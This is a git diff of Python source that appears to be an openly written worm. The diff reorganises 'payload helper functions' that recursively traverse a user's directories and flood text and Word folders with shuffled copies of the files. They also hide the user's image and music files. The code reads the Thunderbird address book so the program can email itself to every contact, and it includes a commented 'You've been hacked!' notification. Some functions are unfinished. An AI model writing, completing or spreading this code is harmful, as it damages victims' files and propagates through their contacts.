@@ -48,92 +48,35 @@ IntKeyStrValDict = typing.Dict[int, str]
 
 
 # --------------------------------------------------------------------------
-# ----------------------- payload helper functions -------------------------
+# ------------------ 4th class payload helper functions --------------------
 # --------------------------------------------------------------------------
 
-def is_file_type(file: str, filetype: str) -> bool:
+def n_rand_numbers(n: int) -> typing.List[int]:
     """
-    Tests whether the passed file is of the passed filetype.
+    Before calling this function, please call the function `random.seed` with a 
+    non-fixed value.
     
-    :file:     a relative or absolute file path.
-    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
-               "odt", "ogg", "png", "txt", "wav"
-    :returns: `True` if the passed `file` is of the specified file type, 
-              `False` otherwise
+    :n:       The length of the list to return.
+    :returns: a list of n numbers between 0 and n, randomly shuffled, 
+              but unique (meaning that each number appears only once in the list); 
+              `None` for n <= 0.
     """
-    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
-                  "jpeg" : "image/jpeg", 
-                  "jpg" : "image/jpeg", 
-                  "mp3" : "audio/mpeg", 
-                  "mp4" : "video/mp4",
-                  "odt" : "application/vnd.oasis.opendocument.text", 
-                  "ogg" : "audio/ogg", 
-                  "png" : "image/png", 
-                  "txt" : "text/plain", 
-                  "wav" : "audio/x-wav"}
-    if file.endswith(filetype):
-        return True
-    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
-    # Provide function which determines the MIME type without having 
-    # the file name extension instead (otherwise, this check doesn't make much sense).
-    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
-        return True
-    return False
-
-
-def make_file_hidden(filepath: str) -> None:
-    """
-    Makes the past file hidden, i.e., writes a "." in front of its name.
-    Assumes that `filepath` is a path to an actually existing file.
+    result = []
     
-    :filepath: The absolute file path to the file to make hidden.
-    """
-    if INSTALLED_OS == WINDOWS:
-        subprocess.check_call(["attrib", "+H", filepath])
-    elif INSTALLED_OS == LINUX:
-        path, name = os.path.split(filepath)
-        name = f".{name}"
-        new_filepath = os.path.join(path, name)
-        os.rename(filepath, new_filepath)
-
-
-def traverse_dirs(curr_dir: str) -> None:
-    """
-    Recursively traverses all directories and subdirectories starting from 
-    `curr_dir` and calls the appropriate processing function for each file.
+    if n <= 0:
+        print("For n_rand_numbers, only positive values make sense!")
+        return None
+    while len(result) < n:
+        i = random.randint(0,n)
+        if i not in result:
+            result.append(i)
     
-    :curr_dir: the directory to start the traversal as absolute file name.
-    """
-    if os.path.islink(curr_dir):
-        print("detected symlink {}".format(curr_dir)) # test output
-        # TODO: Maybe do the same as for directories instead of just ignoring 
-        # symlinks? -> Danger of recursiv loops
-        return
-    if os.path.isfile(curr_dir):
-        if is_file_type(curr_dir, "txt"):
-            # print("TEXT file {}".format(curr_dir)) # test output
-            process_text_file(curr_dir)
-        elif is_file_type(curr_dir, "docx"):
-            # print("DOCX file {}".format(curr_dir)) # test output
-            process_docx_file(curr_dir)
-        elif is_file_type(curr_dir, "jpeg") or is_file_type(curr_dir, "jpg") or is_file_type(curr_dir, "png"):
-            #print("image file {}".format(curr_dir)) # test output
-            make_file_hidden(curr_dir)
-        elif is_file_type(curr_dir, "mp3") or is_file_type(curr_dir, "ogg"):
-            #print("music file {}".format(curr_dir)) # test output
-            make_file_hidden(curr_dir)
-        """
-        elif is_file_type(curr_dir, "odt"):
-            print("ODT file {}".format(curr_dir)) # test output
-            process_odt_file(curr_dir)
-        """
-    if os.path.isdir(curr_dir):
-        # print("DIR {}".format(curr_dir)) # test output
-        for file in os.listdir(curr_dir):
-            # traverse_dirs("{}/{}".format(curr_dir, file))
-            # system-independent version:
-            traverse_dirs(os.path.join(curr_dir, file))
-            
+    return result
+
+
+# --------------------------------------------------------------------------
+# ------------------ 3rd class payload helper functions --------------------
+# --------------------------------------------------------------------------
             
 def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
     """
@@ -164,29 +107,31 @@ def shuffle_filename(filename: str) -> str:
     # to randomly shuffle the positions of those lines.
     # TODO: Implement shuffling
     return filename
-    
 
-def n_rand_numbers(n: int) -> typing.List[int]:
+
+def create_filename(input_filename: str, number: int) -> str:
     """
-    Before calling this function, please call the function `random.seed` with a 
-    non-fixed value.
+    Converts the passed `number` to a string and writes it at the end of the 
+    file name. 
     
-    :n:       The length of the list to return.
-    :returns: a list of n numbers between 0 and n, randomly shuffled, 
-              but unique (meaning that each number appears only once in the list); 
-              `None` for n <= 0.
+    If the file name contains a file name extensions, the number
+    is written directly before this file name extension. This is currently
+    supported for the file name extensions ".txt" and ".docx".
+    
+    :input_filename: a relative or absolute file name
+    :number:         an `int` value
+    :returns:        `input_filename` with added `number`.
     """
-    result = []
+    filename = None
     
-    if n <= 0:
-        print("For n_rand_numbers, only positive values make sense!")
-        return None
-    while len(result) < n:
-        i = random.randint(0,n)
-        if i not in result:
-            result.append(i)
-    
-    return result
+    if input_filename.endswith(".txt"):
+        filename = f"{input_filename[0:len(input_filename)-4:1]}_{str(number)}.txt"
+    elif input_filename.endswith(".docx"):
+        filename = f"{input_filename[0:len(input_filename)-5:1]}_{str(number)}.docx"
+    else:
+        filename = input_filename + str(i)
+        
+    return filename
 
 
 def shuffle_dict_content(dictionary: IntKeyArbValDict) -> IntKeyArbValDict:
@@ -225,31 +170,55 @@ def write_dict_to_text_file(dictionary: IntKeyArbValDict, filename: str) -> None
     with open(filename, "w") as file:
         for i in range(len(dictionary)):
             file.writelines(dictionary[i])
-            
-            
-def create_filename(input_filename: str, number: int) -> str:
+
+
+def write_dict_to_docx_file(dictionary: IntKeyStrValDict, filename: str) -> None:
     """
-    Converts the passed `number` to a string and writes it at the end of the 
-    file name. 
+    Writes every value of `dictionary` to a new line of the docx file with 
+    `filename`.
     
-    If the file name contains a file name extensions, the number
-    is written directly before this file name extension. This is currently
-    supported for the file name extensions ".txt" and ".docx".
-    
-    :input_filename: a relative or absolute file name
-    :number:         an `int` value
-    :returns:        `input_filename` with added `number`.
+    :dictionary: a Python dictionary
+    :filename:   the absolute file name of a docx file
     """
-    filename = None
+    document = docx.Document()
+    paragraph = document.add_paragraph()
+    for i in range(len(dictionary)):
+        paragraph.add_run("{}\n".format(dictionary[i]))
+    document.save(filename)
+
+
+# --------------------------------------------------------------------------
+# ------------------ 2nd class payload helper functions --------------------
+# --------------------------------------------------------------------------
+
+def is_file_type(file: str, filetype: str) -> bool:
+    """
+    Tests whether the passed file is of the passed filetype.
     
-    if input_filename.endswith(".txt"):
-        filename = f"{input_filename[0:len(input_filename)-4:1]}_{str(number)}.txt"
-    elif input_filename.endswith(".docx"):
-        filename = f"{input_filename[0:len(input_filename)-5:1]}_{str(number)}.docx"
-    else:
-        filename = input_filename + str(i)
-        
-    return filename
+    :file:     a relative or absolute file path.
+    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
+               "odt", "ogg", "png", "txt", "wav"
+    :returns: `True` if the passed `file` is of the specified file type, 
+              `False` otherwise
+    """
+    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
+                  "jpeg" : "image/jpeg", 
+                  "jpg" : "image/jpeg", 
+                  "mp3" : "audio/mpeg", 
+                  "mp4" : "video/mp4",
+                  "odt" : "application/vnd.oasis.opendocument.text", 
+                  "ogg" : "audio/ogg", 
+                  "png" : "image/png", 
+                  "txt" : "text/plain", 
+                  "wav" : "audio/x-wav"}
+    if file.endswith(filetype):
+        return True
+    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
+    # Provide function which determines the MIME type without having 
+    # the file name extension instead (otherwise, this check doesn't make much sense).
+    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
+        return True
+    return False
 
 
 def process_text_file(input_filename: str) -> None:
@@ -272,23 +241,8 @@ def process_text_file(input_filename: str) -> None:
         filename = create_filename(input_filename, i)
         file_content = shuffle_dict_content(input_file_content)
         write_dict_to_text_file(file_content, filename)
-    
-
-def write_dict_to_docx_file(dictionary: IntKeyStrValDict, filename: str) -> None:
-    """
-    Writes every value of `dictionary` to a new line of the docx file with 
-    `filename`.
-    
-    :dictionary: a Python dictionary
-    :filename:   the absolute file name of a docx file
-    """
-    document = docx.Document()
-    paragraph = document.add_paragraph()
-    for i in range(len(dictionary)):
-        paragraph.add_run("{}\n".format(dictionary[i]))
-    document.save(filename)
-
-
+        
+        
 # TODO: Add error handling if file opening doesn't work (e.g. because of missing
 # access rights). Instead, just continue to the next file.
 def process_docx_file(input_filename: str) -> None:
@@ -321,11 +275,70 @@ def process_odt_file(file):
     Produces FILES_TO_WRITE_PER_DIR new odt files where each file contains 
     the content of this text file, but with randomly shuffled content.
     """
+    # TODO: to be implemented
     pass
+        
+        
+def make_file_hidden(filepath: str) -> None:
+    """
+    Makes the past file hidden, i.e., writes a "." in front of its name.
+    Assumes that `filepath` is a path to an actually existing file.
+    
+    :filepath: the absolute file path to the file to make hidden.
+    """
+    if INSTALLED_OS == WINDOWS:
+        subprocess.check_call(["attrib", "+H", filepath])
+    elif INSTALLED_OS == LINUX:
+        path, name = os.path.split(filepath)
+        name = f".{name}"
+        new_filepath = os.path.join(path, name)
+        os.rename(filepath, new_filepath)
+        
+        
+# --------------------------------------------------------------------------
+# ------------------ 1st class payload helper functions --------------------
+# --------------------------------------------------------------------------
+
+def traverse_dirs(curr_dir: str) -> None:
+    """
+    Recursively traverses all directories and subdirectories starting from 
+    `curr_dir` and calls the appropriate processing function for each file.
+    
+    :curr_dir: the directory to start the traversal as absolute file name.
+    """
+    if os.path.islink(curr_dir):
+        print("detected symlink {}".format(curr_dir)) # test output
+        # TODO: Maybe do the same as for directories instead of just ignoring 
+        # symlinks? -> Danger of recursive loops
+        return
+    if os.path.isfile(curr_dir):
+        if is_file_type(curr_dir, "txt"):
+            # print("TEXT file {}".format(curr_dir)) # test output
+            process_text_file(curr_dir)
+        elif is_file_type(curr_dir, "docx"):
+            # print("DOCX file {}".format(curr_dir)) # test output
+            process_docx_file(curr_dir)
+        elif is_file_type(curr_dir, "jpeg") or is_file_type(curr_dir, "jpg") or is_file_type(curr_dir, "png"):
+            #print("image file {}".format(curr_dir)) # test output
+            make_file_hidden(curr_dir)
+        elif is_file_type(curr_dir, "mp3") or is_file_type(curr_dir, "ogg"):
+            #print("music file {}".format(curr_dir)) # test output
+            make_file_hidden(curr_dir)
+        """
+        elif is_file_type(curr_dir, "odt"):
+            print("ODT file {}".format(curr_dir)) # test output
+            process_odt_file(curr_dir)
+        """
+    if os.path.isdir(curr_dir):
+        # print("DIR {}".format(curr_dir)) # test output
+        for file in os.listdir(curr_dir):
+            # traverse_dirs("{}/{}".format(curr_dir, file))
+            # system-independent version:
+            traverse_dirs(os.path.join(curr_dir, file))
 
 
 # --------------------------------------------------------------------------
-# ---------------------- send email helper functions ------------------------
+# ----------------- 1st class send email helper functions ------------------
 # --------------------------------------------------------------------------
 
     
@@ -548,21 +561,6 @@ Send this program to all email addresses in the address book of the installed
 Thunderbird or Outlook.
 """
 def send_email() -> None:
-    email_addresses = read_email_addresses_thunderbird()
-    print(email_addresses) # test output
-    # If Mozilla Thunderbird is installed, read the whole address book from 
-    # Thunderbird (SQLite database) and send this program to each address of the 
-    # address book.
-    # If Outlook is installed, do the same for Outlook. This check only needs 
-    # to be done if the operating system is Windows.
-    # TODO: Ensure that emails are not sent to the FROM address.
-
-
-if __name__ == "__main__":
-    random.seed((datetime.now()).strftime("%H%M%S"))
-    
-    #payload()
-    
     thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
     #print(f"thunderbird_install_path = {thunderbird_install_path}") # test output
     if not thunderbird_install_path:
@@ -570,10 +568,23 @@ if __name__ == "__main__":
         sys.exit(0)
     else:
         # Detect all Thunderbird profile directories:
-        l = find_thunderbird_default_profile_dir()
-        print(len(l))
-        #for elem in find_thunderbird_default_profile_dir():
-        #    print(elem)
+        profile_dirs = find_thunderbird_default_profile_dir()
+        for profile_dir in profile_dirs:
+            #print(f"profile_dir = {profile_dir}")
+            email_addresses = read_email_addresses_thunderbird()
+            print(email_addresses) # test output
+            
+    # If Mozilla Thunderbird is installed, read the whole address book from 
+    # Thunderbird (SQLite database) and send this program to each address of the 
+    # address book.
+    # TODO: Ensure that emails are not sent to the FROM address.
+
+
+if __name__ == "__main__":
+    random.seed((datetime.now()).strftime("%H%M%S"))
     
-    # send_email()
+    #payload()
+    #send_email()
     #notification("You've been hacked!", message="", app_name="filewriter")
+    
+    
